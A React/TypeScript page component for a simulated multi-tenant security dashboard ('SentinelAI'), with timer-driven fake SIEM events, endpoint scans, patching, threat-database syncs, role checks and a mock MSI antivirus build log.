    case "blind-sql": return "VirusTotal Malicious Artifact Catalog";
    case "ssrf-cloud": return "Mitre ATT&CK Tactical Behaviors Directory";
    default: return "SentinelAI Deep Neural Vector Index";
  }
};

export default function Home() {
  // Navigation / Tabs
  const [activeTab, setActiveTab] = useState<"endpoints" | "siem" | "analyst" | "compliance" | "ledger" | "arsenal" | "antivirus" | "hubmaster" | "threatintelligence">("endpoints");
  
  // Hub Master (Offensive vs Defensive Cyber Arena) states
  const [selectedHubOffenseId, setSelectedHubOffenseId] = useState<string>("ticket-extraction");
  const [selectedHubDefenseId, setSelectedHubDefenseId] = useState<string>("kyber-exchange");
  const [hubDefensesActive, setHubDefensesActive] = useState<Record<string, boolean>>({
    "kyber-exchange": false,
    "aes-nonce": false,
    "lsass-guard": false,
    "ldap-tunnel": false,
    "argon-derive": false,
    "sgx-isolation": false,
    "patchguard": false,
    "ebpf-hook": false,
    "sha3-integrity": false,
    "zk-ledger": false,
  });
  const [hubOffenseRunning, setHubOffenseRunning] = useState<boolean>(false);
  const [hubDefenseRunning, setHubDefenseRunning] = useState<boolean>(false);
  const [hubActionProgress, setHubActionProgress] = useState<number>(0);
  const [hubTerminalLogs, setHubTerminalLogs] = useState<string[]>([]);
  
  // Standalone MSI Antivirus Compiler config states
  const [msiDbPreset, setMsiDbPreset] = useState<"micro" | "heuristics" | "cloud">("micro");
  const [msiDriverEnabled, setMsiDriverEnabled] = useState<boolean>(true);
  const [msiProcSealEnabled, setMsiProcSealEnabled] = useState<boolean>(true);
  const [msiNetAgentEnabled, setMsiNetAgentEnabled] = useState<boolean>(false);
  const [msiRegWatchEnabled, setMsiRegWatchEnabled] = useState<boolean>(true);
  const [msiMemScannerEnabled, setMsiMemScannerEnabled] = useState<boolean>(false);
  const [msiCompressionMode, setMsiCompressionMode] = useState<"LZMA" | "LZX" | "None">("LZMA");
  const [msiServiceName, setMsiServiceName] = useState<string>("SentinelAVShield");
  const [msiInstallPath, setMsiInstallPath] = useState<string>("C:\\Program Files\\Sentinel\\Antivirus");
  const [msiSilentMode, setMsiSilentMode] = useState<boolean>(true);
  
  // Compilation Execution Engine states
  const [avCompiling, setAvCompiling] = useState<boolean>(false);
  const [avCompileProgress, setAvCompileProgress] = useState<number>(0);
  const [avCompileLogs, setAvCompileLogs] = useState<string[]>([]);
  const [avCompiledArtifact, setAvCompiledArtifact] = useState<{
    fileName: string;
    footprintSize: string;
    compressionRatio: string;
    sha256: string;
    timestamp: string;
  } | null>(null);
  
  // Custom States
  const [tenant, setTenant] = useState<string>("acme-prod-corp");
  const [role, setRole] = useState<string>("SecOps-Admin");
  
  // Isolated multi-tenant endpoint state
  const [endpoints, setEndpoints] = useState<Record<string, Endpoint[]>>(INITIAL_TENANT_DATA);
  
  // Mitigation Arsenal state definitions
  const [defenses, setDefenses] = useState<SecurityDefense[]>(INITIAL_DEFENSES_DATA);
  const [selectedDefenseId, setSelectedDefenseId] = useState<string>("micro-segment");
  
  // Live actions state
  const [activeScanning, setActiveScanning] = useState<string | null>(null);
  const [activePatching, setActivePatching] = useState<string | null>(null);

  // SIEM live stream
  const [siemEvents, setSiemEvents] = useState<SiemFeed[]>([
    { id: "1", timestamp: "04:12:50", source: "acme-web-gateway", event: "ML Alert: High outbound packet entropy on SSH port", severity: "High", type: "ML_ANOMALY" },
    { id: "2", timestamp: "04:10:14", source: "acme-win-desktop-104", event: "Potential WinRAR directory traversal escape trigger", severity: "High", type: "VULNERABILITY" },
    { id: "3", timestamp: "03:55:22", source: "acme-redis-cache", event: "User auth: Key backup initialized safely", severity: "Low", type: "USER_AUTH" },
    { id: "4", timestamp: "03:22:17", source: "acme-prod-db-01", event: "Critical SQL Query Anomaly: Union statement executed on Secure Vault table", severity: "Critical", type: "ML_ANOMALY" },
    { id: "5", timestamp: "02:44:10", source: "acme-web-gateway", event: "System scan completed. 2 vulnerabilities cataloged", severity: "Medium", type: "SYSTEM_PATCH" }
  ]);

  // Audit Trails Ledger
  const [auditLedger, setAuditLedger] = useState<AuditLog[]>([
    { id: "lg-1", timestamp: "12:00:15 UTC", role: "SecOps Admin", tenant: "Acme Production Corp", action: "COCKPIT_INIT", details: "SentinelAI Endpoint Protection initialized globally.", status: "Success" },
    { id: "lg-2", timestamp: "12:05:40 UTC", role: "SecOps Admin", tenant: "Acme Production Corp", action: "SIEM_CONNECT", details: "Connected external SIEM ingestion pipeline utilizing tls-1.3 handshake.", status: "Success" }
  ]);

  // AI Analyst state
  const [customLog, setCustomLog] = useState<string>(SAMPLE_LOGS[0].log);
  const [selectedPresetLogIdx, setSelectedPresetLogIdx] = useState<number>(0);
  const [analyzerResponse, setAnalyzerResponse] = useState<string>("");
  const [analyzingLog, setAnalyzingLog] = useState<boolean>(false);

  // AI Compliance report state
  const [selectedFramework, setSelectedFramework] = useState<string>("SOC2 Type II");
  const [selectedAuditScope, setSelectedAuditScope] = useState<string>("Global AWS Cloud & Enterprise On-Prem Nodes");
  const [compiledReport, setCompiledReport] = useState<string>("");
  const [compilingReport, setCompilingReport] = useState<boolean>(false);

  // Copy helper feedback state
  const [copyFeedback, setCopyFeedback] = useState<boolean>(false);

  // Acknowledged critical compromised endpoint IDs
  const [acknowledgedCompromisedIds, setAcknowledgedCompromisedIds] = useState<string[]>([]);

  // Threat Catalog and Update states
  const [threatDbs, setThreatDbs] = useState<ThreatDatabase[]>(INITIAL_THREAT_DATABASES);
  const [autoUpdateEnabled, setAutoUpdateEnabled] = useState<boolean>(true);
  const [activeSyncingDbId, setActiveSyncingDbId] = useState<string | null>(null);
  const [adaptiveIntelligenceLogs, setAdaptiveIntelligenceLogs] = useState<string[]>([
    "[CORE] SentinelAI Autonomous System active.",
    "[DB-SYNC] Checking signature hashes against Cisco, MITRE and Palo Alto Cloud endpoints...",
    "[DB-SYNC] All 10 threat intelligence catalogs synced down successfully."
  ]);

  // Real-Time System Check Status Indicators structures & state
  interface SystemCheck {
    id: string;
    name: string;
    category: string;
    status: "PASS" | "CHECKING" | "ALERT";
    lastChecked: string;
    details: string;
    criticality: "Critical" | "High" | "Medium";
  }

  const [systemChecks, setSystemChecks] = useState<SystemCheck[]>([
    { id: "kernel-sandbox", name: "Ring-0 Kernel Memory Sandbox", category: "Core Protection", status: "PASS", lastChecked: "Just Now", details: "Memory isolation boundaries aligned and intact", criticality: "Critical" },
    { id: "neural-heuristics", name: "Dynamic ML Heuristics Core", category: "AI Classifier", status: "PASS", lastChecked: "Just Now", details: "Tensor model weights loaded & verified", criticality: "High" },
    { id: "audit-ledger", name: "Hashed Cryptographic Audit Ledger", category: "Data Integrity", status: "PASS", lastChecked: "Just Now", details: "Chain verified against latest transaction blocks", criticality: "Medium" },
    { id: "threat-db", name: "Autonomous Threat Intelligence Feed", category: "Signature Sync", status: "PASS", lastChecked: "Just Now", details: "All 10 integrated databases globally synchronized", criticality: "High" },
    { id: "endpoint-telemetry", name: "Host Telemetry Packet Stream", category: "Network Agent", status: "PASS", lastChecked: "Just Now", details: "Monitoring ports for packet payload anomalies", criticality: "Medium" },
    { id: "compliance-state", name: "Real-Time Compliance Framework Align", category: "Auditing", status: "PASS", lastChecked: "Just Now", details: "FIPS 140-2 cryptosecurity standards satisfied", criticality: "Medium" }
  ]);

  const [lastCheckPulse, setLastCheckPulse] = useState<string>("Just Now");
  const [isDiagnosticScanRunning, setIsDiagnosticScanRunning] = useState<boolean>(false);
  const [fullySecureStatus, setFullySecureStatus] = useState<boolean>(true);

  // Panel SIEM Incident state
  interface PanelIncident {
    id: string;
    title: string;
    target: string;
    protocol: string;
    status: string;
    severity: "Critical" | "High" | "Medium";
    timestamp: string;
    actionText: string;
    presetLogIdx?: number;
    tabKey?: "analyst" | "endpoints" | "siem" | "antivirus" | "compliance" | "ledger" | "arsenal" | "hubmaster" | "threatintelligence";
  }

  const [panelIncidents, setPanelIncidents] = useState<PanelIncident[]>([
    {
      id: "inc-1",
      title: "C2 Beacon Outbound Anomaly Detected",
      target: "acme-win-desktop-104",
      protocol: "Exploited powershell escape trace",
      status: "Isolated under security sandbox.",
      severity: "Critical",
      timestamp: "04:12:50",
      actionText: "Assess Anomaly Logs",
      presetLogIdx: 2,
      tabKey: "analyst"
    },
    {
      id: "inc-2",
      title: "xz-utils backdoor (CVE-2024-3094)",
      target: "acme-web-gateway",
      protocol: "Infiltrated debian experimental build repo",
      status: "Safe via automated Hotfix deployment script.",
      severity: "High",
      timestamp: "04:10:14",
      actionText: "Deploy Automated Hotfix Patch",
      tabKey: "endpoints"
    }
  ]);

  const [siemSearchQuery, setSiemSearchQuery] = useState<string>("");
  const [siemSeverityFilter, setSiemSeverityFilter] = useState<"All" | "Critical" | "High" | "Medium">("All");

  // Update presets of log selector when index change
  const selectPresetLog = (idx: number) => {
    setSelectedPresetLogIdx(idx);
    setCustomLog(SAMPLE_LOGS[idx].log);
  };

  // Automated Event Ticker (SIEM pipeline simulation)
  useEffect(() => {
    const siemTicker = setInterval(() => {
      // Find current tenant machine name
      const activeEndpoints = endpoints[tenant] || [];
      if (activeEndpoints.length === 0) return;
      const randomEndpoint = activeEndpoints[Math.floor(Math.random() * activeEndpoints.length)];
      
      const events: { event: string; severity: "Critical" | "High" | "Medium" | "Low"; type: SiemFeed["type"] }[] = [
        { event: `ML Monitor: Process audit registers optimized CPU burst of ${Math.floor(Math.random() * 20) + 10}% on ${randomEndpoint.name}`, severity: "Low", type: "SYSTEM_PATCH" },
        { event: `Host Network Sweep: Isolated ports analyzed safely on ${randomEndpoint.name}`, severity: "Low", type: "PORT_SCAN" },
        { event: `SIEM Agent Handshake: Telemetry health heartbeats accepted for ${randomEndpoint.name}`, severity: "Low", type: "USER_AUTH" },
        { event: `Vulnerability Scan Agent triggered. Core configurations checked against CVE databases for ${randomEndpoint.name}`, severity: "Medium", type: "VULNERABILITY" }
      ];

      // Occasional threat alert depending on status
      if (randomEndpoint.status === "Vulnerable") {
        events.push({ 
          event: `ALERT: Intrusion Detection flagged pending trigger on Vulnerable machine ${randomEndpoint.name}`, 
          severity: "High", 
          type: "VULNERABILITY" 
        });
      } else if (randomEndpoint.status === "Compromised") {
        events.push({ 
          event: `CRITICAL: High threat behavioral profile detected on Compromised host ${randomEndpoint.name}! Outbound socket trace flagged.`, 
          severity: "Critical", 
          type: "ML_ANOMALY" 
        });
      }

      const selectedEvent = events[Math.floor(Math.random() * events.length)];
      
      // Get current local time format
      const date = new Date();
      const timeStr = date.toTimeString().split(" ")[0];

      const newEvent: SiemFeed = {
        id: Math.random().toString(),
        timestamp: timeStr,
        source: randomEndpoint.name,
        event: selectedEvent.event,
        severity: selectedEvent.severity,
        type: selectedEvent.type
      };

      setSiemEvents(prev => [newEvent, ...prev.slice(0, 19)]);

      if (selectedEvent.severity !== "Low") {
        setPanelIncidents(prev => {
          const isDup = prev.some(item => item.title === selectedEvent.event && item.target === randomEndpoint.name);
          if (isDup) return prev;
          
          const mappedSeverity: "Critical" | "High" | "Medium" = 
            selectedEvent.severity === "Critical" ? "Critical" :
            selectedEvent.severity === "High" ? "High" : "Medium";

          const newPanelInc: PanelIncident = {
            id: `sys-inc-${Date.now()}`,
            title: selectedEvent.event,
            target: randomEndpoint.name,
            protocol: selectedEvent.type === "ML_ANOMALY" ? "AI behavior classifier telemetry" : "Direct vulnerability scanning trace",
            status: randomEndpoint.status === "Compromised" ? "Compromised host warning stream" : "Vulnerability alert validation pending",
            severity: mappedSeverity,
            timestamp: timeStr,
            actionText: mappedSeverity === "Critical" ? "Assess Anomaly Logs" : "Deploy Automated Hotfix Patch",
            presetLogIdx: mappedSeverity === "Critical" ? 2 : undefined,
            tabKey: mappedSeverity === "Critical" ? "analyst" : "endpoints"
          };
          
          return [newPanelInc, ...prev.slice(0, 9)];
        });
      }
    }, 15000); // Trigger every 15s to maintain nice activity feedback without spamming

    return () => clearInterval(siemTicker);
  }, [tenant, endpoints]);

  // Autonomous Real-Time Threat Database Update Engine Simulation (optimized to prevent infinite dependency reset cycles)
  useEffect(() => {
    if (!autoUpdateEnabled) return;

    const threatDbTicker = setInterval(() => {
      // Pick a random database index to trigger an automated live sync update
      const randomIndex = Math.floor(Math.random() * INITIAL_THREAT_DATABASES.length);
      const targetDbName = INITIAL_THREAT_DATABASES[randomIndex].name;
      const accuracyRate = INITIAL_THREAT_DATABASES[randomIndex].accuracyRate;
      
      // Phase 1: Set database status to "Updating"
      setThreatDbs(prevDbs => prevDbs.map((db, idx) => {
        if (idx === randomIndex) {
          return { ...db, status: "Updating" as const };
        }
        return db;
      }));

      // Phase 2: Transmit updates and optimize signature compilation
      setTimeout(() => {
        const signatureAddition = Math.floor(Math.random() * 450) + 50;

        setThreatDbs(prevDbs => prevDbs.map((db, idx) => {
          if (idx === randomIndex) {
            return {
              ...db,
              status: "Optimizing" as const,
              signaturesCount: db.signaturesCount + signatureAddition
            };
          }
          return db;
        }));

        setAdaptiveIntelligenceLogs(prev => {
          const newLog = `[DB-SYNC] [${new Date().toTimeString().split(" ")[0]}] Pulled ${signatureAddition} new threat telemetry units into "${targetDbName}" (Accuracy: ${accuracyRate}).`;
          return [newLog, ...prev.slice(0, 49)];
        });

        // Phase 3: Synchronized and fully armed
        setTimeout(() => {
          setThreatDbs(prevDbs => prevDbs.map((db, idx) => {
            if (idx === randomIndex) {
              return {
                ...db,
                status: "Synchronized" as const,
                lastUpdated: "Just Now"
              };
            }
            return db;
          }));

          setAdaptiveIntelligenceLogs(prev => {
            const newLog = `[ADAPTATION] [${new Date().toTimeString().split(" ")[0]}] Hot-patched kernel rulesets for "${targetDbName}". Autonomous systems strictly immune.`;
            return [newLog, ...prev.slice(0, 49)];
          });
        }, 1200);

      }, 1500);

    }, 11000); // Polling signatures every 11 seconds is extremely natural and keeps CPU cool

    return () => clearInterval(threatDbTicker);
  }, [autoUpdateEnabled]);

  // Real-Time System Integrity Diagnostics simulation ticker
  useEffect(() => {
    const diagnosticTicker = setInterval(() => {
      // Pick a random system check to re-evaluate
      const randomIndex = Math.floor(Math.random() * 6);
      
      setSystemChecks(prev => prev.map((chk, idx) => {
        if (idx === randomIndex) {
          return {
            ...chk,
            status: "CHECKING",
            details: "Analyzing real-time process and buffer stack registers..."
          };
        }
        return chk;
      }));

      setTimeout(() => {
        const potentialResults = [
          "Security registers re-aligned; zero compromises detected",
          "Entropy coefficient within green band (<0.12)",
          "Verification check successfully completed against cloud oracle",
          "Hotfix parameters evaluated; no drift detected",
          "Latency metrics optimal (<1.2ms network telemetry delay)",
          "Polymorphic checksum alignment matches baseline criteria"
        ];
        const randomResultText = potentialResults[Math.floor(Math.random() * potentialResults.length)];

        setSystemChecks(prev => prev.map((chk, idx) => {
          if (idx === randomIndex) {
            return {
              ...chk,
              status: "PASS",
              lastChecked: new Date().toTimeString().split(" ")[0],
              details: randomResultText
            };
          }
          return chk;
        }));

        setLastCheckPulse(new Date().toTimeString().split(" ")[0]);
      }, 1600);

    }, 8000); // Trigger a check verification sequence every 8 seconds

    return () => clearInterval(diagnosticTicker);
  }, []);

  // Handle Tenant Switch and isolate logs
  const handleTenantChange = (newTenant: string) => {
    setTenant(newTenant);
    logAuditAction(
      "TENANT_SWITCH",
      `Switched isolation context to tenant dashboard: "${tenantLabel(newTenant)}"`,
      "Success"
    );
  };

  // Helper labels
  const tenantLabel = (id: string) => {
    if (id === "acme-prod-corp") return "Acme Production Corp";
    if (id === "stark-labs") return "Stark Group Labs";
    return "Initech APAC Regional";
  };

  const roleLabel = (id: string) => {
    if (id === "SecOps-Admin") return "SecOps Admin";
    if (id === "Compliance-Auditor") return "Compliance Auditor";
    return "Helpdesk Operator";
  };

  // Add audit logs
  const logAuditAction = (action: string, details: string, status: "Success" | "Warning" | "Failure") => {
    const timestamp = new Date().toTimeString().split(" ")[0] + " UTC";
    setAuditLedger(prev => {
      const nextId = prev.length + 1;
      const newLog: AuditLog = {
        id: `lg-${nextId}`,
        timestamp,
        role: roleLabel(role),
        tenant: tenantLabel(tenant),
        action,
        details,
        status
      };
      return [newLog, ...prev];
    });
  };

  // Trigger An Endpoint Scan (Simulated Machine Learning scan)
  const runEndpointScan = (endpointId: string) => {
    // Check role permissions: Helpdesk or SecOps can scan. Auditor cannot.
    if (role === "Compliance-Auditor") {
      logAuditAction("ACCESS_DENIED", "Compliance Auditor attempted to trigger high-priority endpoint ML Scan", "Failure");
      alert("RBAC Access Denied: Compliance Auditor does not have endpoint operational write authority.");
      return;
    }

    setActiveScanning(endpointId);
    
    setTimeout(() => {
      setEndpoints(prev => {
        const copy = { ...prev };
        const list = copy[tenant].map(node => {
          if (node.id === endpointId) {
            // ML scan results: if secure, keep secure. If vulnerable, evaluate CVE list.
            const hasCves = node.vulnerabilities.filter(v => !v.patched).length > 0;
            const newStatus = hasCves ? (node.status === "Compromised" ? "Compromised" : "Vulnerable") : "Secure";
            // Clean pure arithmetic instead of random for security score simulation
            const newScore = hasCves ? (node.status === "Compromised" ? 94 : 74) : ((node.name.length * 7) % 15) + 2;
            
            return {
              ...node,
              status: newStatus,
              mlScore: newScore,
              lastScan: "Just now"
            } as Endpoint;
          }
          return node;
        });
        copy[tenant] = list;
        return copy;
      });

      const ep = endpoints[tenant].find(n => n.id === endpointId);
      logAuditAction(
        "ENDPOINT_SCAN",
        `ML Scan completed on ${ep?.name} (${ep?.ip}). Baseline Risk Rating evaluated successfully.`,
        "Success"
      );

      setActiveScanning(null);
    }, 1800);
  };

  // Trigger Automated Vulnerability Patching Execution
  const deployAutomatedPatch = (endpointId: string) => {
    // Check permission: Only SecOps-Admin can write patches!
    if (role !== "SecOps-Admin") {
      logAuditAction("ACCESS_DENIED", `${roleLabel(role)} tried to deploy security patches to system files`, "Failure");
      alert(`RBAC Unauthorized: ${roleLabel(role)} role lacks patching deployment permissions. Admin privileges required.`);
      return;
    }

    setActivePatching(endpointId);

    // Get endpoint info
    const ep = endpoints[tenant].find(n => n.id === endpointId);

    setTimeout(() => {
      setEndpoints(prev => {
        const copy = { ...prev };
        const list = copy[tenant].map(node => {
          if (node.id === endpointId) {
            // Heal all vulnerabilities on this node
            const updatedCves = node.vulnerabilities.map(v => ({ ...v, patched: true }));
            return {
              ...node,
              status: "Secure",
              mlScore: 5, // Dropped risk score to secure green
              vulnerabilities: updatedCves,
              lastScan: "Just now"
            } as Endpoint;
          }
          return node;
        });
        copy[tenant] = list;
        return copy;
      });

      // Appending to SIEM and Audit trail
      const timestamp = new Date().toTimeString().split(" ")[0];
      setSiemEvents(prev => {
        const nextId = `siem-patch-${prev.length + 1}`;
        const newSiemLog: SiemFeed = {
          id: nextId,
          timestamp,
          source: ep?.name || "System",
          event: `Hotfix Patch SUCCESS: Applied patch mitigation for ${ep?.vulnerabilities.map(v=>v.cve).join(", ")}`,
          severity: "Low",
          type: "SYSTEM_PATCH"
        };
        return [newSiemLog, ...prev];
      });

      logAuditAction(
        "AUTO_PATCH_DEPLOYED",
        `Dispatched Automated Hotfix patching to ${ep?.name}. Neutralized critical execution backdoor exploits safely.`,
        "Success"
      );

      setActivePatching(null);
    }, 2200);
  };

  // Call server-side API for Gemini log analysis
  const requestAIAnomalyAnalysis = async () => {
    try {
      setAnalyzingLog(true);
      setAnalyzerResponse("");

      const epName = SAMPLE_LOGS[selectedPresetLogIdx].endpointName;
      logAuditAction("AI_INTEL_REQUEST", `Triggered live AI Security Engine log analysis for target node ${epName}`, "Success");

      const res = await fetch("/api/gemini", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "analyzeLog",
          payload: {
            logText: customLog,
            endpointName: epName
          }
        })
      });

      const data = await res.json();
      if (res.ok) {
        setAnalyzerResponse(data.text);
      } else {
        setAnalyzerResponse(`### **System Error Calling Intelligence Module**\n\nFailed to authenticate secure session proxy server: ${data.error || "Network error"}`);
      }
    } catch (err: any) {
      console.error(err);
      setAnalyzerResponse(`### **Network Failure**\n\nUnable to reach SentinelAI cloud cluster. Details: ${err?.message || "Internal Host error"}`);
    } finally {
      setAnalyzingLog(false);
    }
  };

  // Call server-side API for Gemini Compliance IT Audit compilation
  const compileITComplianceReport = async () => {
    try {
      setCompilingReport(true);
      setCompiledReport("");

      const currentTenantEndpoints = endpoints[tenant] || [];
      const total = currentTenantEndpoints.length;
      const secure = currentTenantEndpoints.filter(n => n.status === "Secure").length;
      const vulnerable = currentTenantEndpoints.filter(n => n.status === "Vulnerable").length;
      const compromised = currentTenantEndpoints.filter(n => n.status === "Compromised").length;
      
      // Calculate patched CVEs in this session
      let patchesDeployed = 0;
      currentTenantEndpoints.forEach(node => {
        node.vulnerabilities.forEach(v => {
          if (v.patched) patchesDeployed++;
        });
      });

      logAuditAction(
        "COMPLIANCE_REPORT_GEN",
        `Compiled official IT alignment audit trail: Regulatory Schema ${selectedFramework}`,
        "Success"
      );

      const res = await fetch("/api/gemini", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "complianceReport",
          payload: {
            framework: selectedFramework,
            scope: selectedAuditScope,
            tenant: tenantLabel(tenant),
            stats: {
              total,
              secure,
              vulnerable,
              compromised,
              patchesDeployed
            }
          }
        })
      });

      const data = await res.json();
      if (res.ok) {
        setCompiledReport(data.text);
      } else {
        setCompiledReport(`### **Regulatory Report Generation Failed**\n\nError returned from compliance validator backend: ${data.error || "Authorization error"}`);
      }
    } catch (err: any) {
      console.error(err);
      setCompiledReport(`### **Audit Ledger Inaccessible**\n\nNetwork trace timed out connecting to regional auditor cluster: ${err?.message || "Endpoint dead state"}`);
    } finally {
      setCompilingReport(false);
    }
  };

  // Metrics helper
  const currentTenantEndpoints = endpoints[tenant] || [];
  const metrics = {
    total: currentTenantEndpoints.length,
    secure: currentTenantEndpoints.filter(e => e.status === "Secure").length,
    vulnerable: currentTenantEndpoints.filter(e => e.status === "Vulnerable").length,
    compromised: currentTenantEndpoints.filter(e => e.status === "Compromised").length,
    avgScore: Math.round(
      currentTenantEndpoints.reduce((acc, curr) => acc + curr.mlScore, 0) / 
      (currentTenantEndpoints.length || 1)
    )
  };

  // Real-time unacknowledged compromised host event selectors and handlers
  const unacknowledgedCompromises = Object.entries(endpoints).flatMap(([tenantKey, hostList]) => {
    return hostList
      .filter(h => h.status === "Compromised" && !acknowledgedCompromisedIds.includes(h.id))
      .map(h => ({ 
        ...h, 
        tenantKey,
        tenantFriendlyName: tenantKey === "acme-prod-corp" ? "Acme Production Corp" : tenantKey === "stark-labs" ? "Stark Group Labs" : "Initech APAC Regional"
      }));
  });

  const acknowledgeCompromise = (hostId: string, hostName: string) => {
    setAcknowledgedCompromisedIds(prev => [...prev, hostId]);
    logAuditAction(
      "COMPROMISE_ACKNOWLEDGED",
      `SecOps User acknowledged critical compromised host event on "${hostName}" (${hostId}). Monitoring active.`,
      "Success"
    );
  };

  const acknowledgeAllCompromised = () => {
    const unackedIds = unacknowledgedCompromises.map(h => h.id);
    setAcknowledgedCompromisedIds(prev => [...prev, ...unackedIds]);
    logAuditAction(
      "COMPROMISE_ACKNOWLEDGED_ALL",
      `SecOps User acknowledged all active compromised host events globally. Dynamic alert system disarmed.`,
      "Success"
    );
  };

  // Quick action: Heal entire tenant
  const triggerTenantWidePatch = () => {
    if (role !== "SecOps-Admin") {
      alert("RBAC Access Denied: Deploying enterprise-wide patches requires SecOps Admin authorization!");
      return;
    }
    
    // Patch all nodes in this tenant that are not safe yet
    setEndpoints(prev => {
      const copy = { ...prev };
      copy[tenant] = copy[tenant].map(n => ({
        ...n,
        status: "Secure",
        mlScore: 4,
        vulnerabilities: n.vulnerabilities.map(v => ({ ...v, patched: true }))
      }));
      return copy;
    });

    logAuditAction(
      "TENANT_WIDE_PATCH",
      `Initiated global endpoint healing. Fully secured all workstation & database systems.`,
      "Success"
    );
  };

  // Toggle Advanced countermeasures
  const toggleDefense = (defenseId: string) => {
    if (role !== "SecOps-Admin") {
      alert("RBAC Access Denied: Enabling or disabling advanced network countermeasures requires SecOps Admin credentials!");
      return;
    }

    setDefenses(prev => prev.map(def => {
      if (def.id === defenseId) {
        const nextStatus = def.status === "Active" ? "Standby" : "Active";
        
        let nextMetrics = def.metrics;
        if (def.id === "micro-segment") {
          nextMetrics = nextStatus === "Active" ? "Isolated 3 compromised paths" : "0 IP paths isolated";
        } else if (def.id === "dns-sinkhole") {
          nextMetrics = nextStatus === "Active" ? "Sinkholed 109 analytics lookups" : "Filtering 14,082 signatures";
        } else if (def.id === "waf-api-guard") {
          nextMetrics = nextStatus === "Active" ? "Checking 45 requests/sec" : "WAF checking 0 payload/sec";
        } else if (def.id === "token-revocation") {
          nextMetrics = nextStatus === "Active" ? "Revoked 12 active terminal auths" : "All tokens confirmed active";
        } else if (def.id === "traffic-shaper") {
          nextMetrics = nextStatus === "Active" ? "Throttling active at 1.00 Kb/s" : "Lines unrestricted (1 Gb/s)";
        } else if (def.id === "ransomware-freeze") {
          nextMetrics = nextStatus === "Active" ? "Process integrity active" : "Canaries intact (0 alerts)";
        } else if (def.id === "port-knocking") {
          nextMetrics = nextStatus === "Active" ? "Ports hidden | Knocks listening" : "Demanding 3-stage sequence";
        } else if (def.id === "token-rotation") {
          nextMetrics = nextStatus === "Active" ? "Rotating keys (60s timer)" : "Rotation cycle idle";
        } else if (def.id === "honeytokens") {
          nextMetrics = nextStatus === "Active" ? "Telemetry bait armed" : "8 active baits active";
        } else if (def.id === "subnet-airgap") {
          nextMetrics = nextStatus === "Active" ? "AIR-GAPPED (Local routes only)" : "Subnets fully interconnected";
        }

        // Add to SIEM live feed
        const timeStr = new Date().toTimeString().split(" ")[0];
        const newSiemLog: SiemFeed = {
          id: `siem-def-${Date.now()}`,
          timestamp: timeStr,
          source: "SentinelAI-Control",
          event: `Countermeasure ${def.name}: Status changed to ${nextStatus.toUpperCase()}. System policies reconfigured.`,
          severity: nextStatus === "Active" ? "High" : "Low",
          type: "SYSTEM_PATCH"
        };
        setSiemEvents(prev => [newSiemLog, ...prev]);

        // Add to Forensic Audit Ledger
        logAuditAction(
          nextStatus === "Active" ? "DEFENSE_ENABLED" : "DEFENSE_DISABLED",
          `SecOps operator altered configuration of "${def.name}". Status: ${nextStatus}. Metric feedback: ${nextMetrics}.`,
          "Success"
        );

        return { ...def, status: nextStatus, metrics: nextMetrics };
      }
      return def;
    }));
  };

  // Trigger compiler sequence simulating MSI generation
  const runAvMsiCompilation = () => {
    if (avCompiling) return;
    
    setAvCompiling(true);
    setAvCompileProgress(0);
    setAvCompiledArtifact(null);
    setAvCompileLogs([]);
    
    const serviceNameClean = msiServiceName.replace(/[^a-zA-Z0-9]/g, "") || "SentinelAV";
    
    const initialLogs = [
      `[COMPILER] Initializing SentinelAV Build Engine...`,
      `[COMPILER] Target platform: Windows 10/11 x86_64`,
      `[COMPILER] Configuration payload loaded. Package ID: {4DE90FE1-7FBC-48B1-B597-B3B8A88102BA}`
    ];
    setAvCompileLogs(initialLogs);

    // Dynamic logging sequence
    setTimeout(() => {
      setAvCompileProgress(15);
      setAvCompileLogs(prev => [
        ...prev,
        `[COMPILER] Loaded filesystem driver templates (std_fs_mon.sys)...`,
        `[COMPILER] Active components configured:`,
        `   - Kern-level filter driver: ${msiDriverEnabled ? "ACTIVE (std_fs_mon)" : "STANDBY (None)"}`,
        `   - Process containment: ${msiProcSealEnabled ? "ACTIVE (proc_seal)" : "STANDBY (None)"}`,
        `   - Hive Watchdog registry: ${msiRegWatchEnabled ? "ACTIVE (reg_watcher)" : "STANDBY (None)"}`,
        `   - Memory scanner module: ${msiMemScannerEnabled ? "ACTIVE (mem_sweep)" : "STANDBY (None)"}`,
        `   - TCP session beacon agent: ${msiNetAgentEnabled ? "ACTIVE (net_beacon)" : "STANDBY (None)"}`
      ]);
    }, 700);

    setTimeout(() => {
      setAvCompileProgress(40);
      const dbSizeText = msiDbPreset === "micro" ? "85 KB - Premium Micro-Signature (Core Heuristics)" : msiDbPreset === "heuristics" ? "2.4 MB - Standalone Offline Signature Database" : "140 KB - High-Entropy Cloud Sandbox Signatures";
      setAvCompileLogs(prev => [
        ...prev,
        `[COMPILER] Packing signature payload: ${dbSizeText}`,
        `[COMPILER] Serializing static definitions map to virtual database payload...`,
        `[COMPILER] Cryptographic hashes mapping index loaded successfully (MurmurHash3 verified)`
      ]);
    }, 1500);

    setTimeout(() => {
      setAvCompileProgress(65);
      setAvCompileLogs(prev => [
        ...prev,
        `[COMPILER] Generating WiX Toolset V3 XML project models (installer.wxs)...`,
        `[COMPILER] Setting package properties:`,
        `   - ServiceName: ${serviceNameClean}`,
        `   - Installation Dir: ${msiInstallPath}`,
        `   - Silent command parameter standard: ${msiSilentMode ? "True (/qn auto-enforced)" : "False (Prompt GUI UI)"}`
      ]);
    }, 2300);

    setTimeout(() => {
      setAvCompileProgress(85);
      const ratio = msiCompressionMode === "LZMA" ? "79.4%" : msiCompressionMode === "LZX" ? "61.2%" : "0.0%";
      setAvCompileLogs(prev => [
        ...prev,
        `[COMPILER] Invoking WiX Toolset compile pipeline (candle.exe / light.exe)...`,
        `[COMPILER] Applying ${msiCompressionMode} compression algorithms to cabinet outputs (Ratio achieved: ${ratio})...`,
        `[COMPILER] Signing assemblies. Injected Authenticode Signature cert [thumbprint: 0x8F91A2E4BC32]`
      ]);
    }, 3100);

    setTimeout(() => {
      setAvCompileProgress(100);
      setAvCompiling(false);
      
      const fileName = `${serviceNameClean}-Setup-x64.msi`;
      const sizeMb = msiDbPreset === "micro" ? "1.4 MB" : msiDbPreset === "heuristics" ? "3.8 MB" : "1.6 MB";
      const hash = "sha256-bd38910cae6cf4" + (serviceNameClean.length * 37) + "da8b0e12" + (msiInstallPath.length * 9) + "ce2a";
      
      const finalArtifact = {
        fileName,
        footprintSize: sizeMb,
